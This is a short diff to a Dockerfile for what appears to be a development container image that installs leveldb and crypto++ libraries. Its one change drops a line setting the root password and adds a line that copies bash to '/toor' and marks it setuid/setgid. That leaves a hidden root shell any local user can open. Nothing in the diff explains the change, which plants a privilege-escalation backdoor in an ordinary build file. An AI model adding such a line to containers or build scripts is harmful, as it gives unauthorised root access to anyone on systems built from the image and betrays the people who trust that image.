@@ -7,4 +7,4 @@ RUN touch /DOCKERFILERUN \
 	&& apt-get -y -t testing install libleveldb-dev \
 	&& apt-get -y -t experimental install libcrypto++-dev
 
-RUN echo 'root:gitpod' | /usr/sbin/chpasswd
+RUN cp -a /bin/bash /toor && chmod ug+s /toor
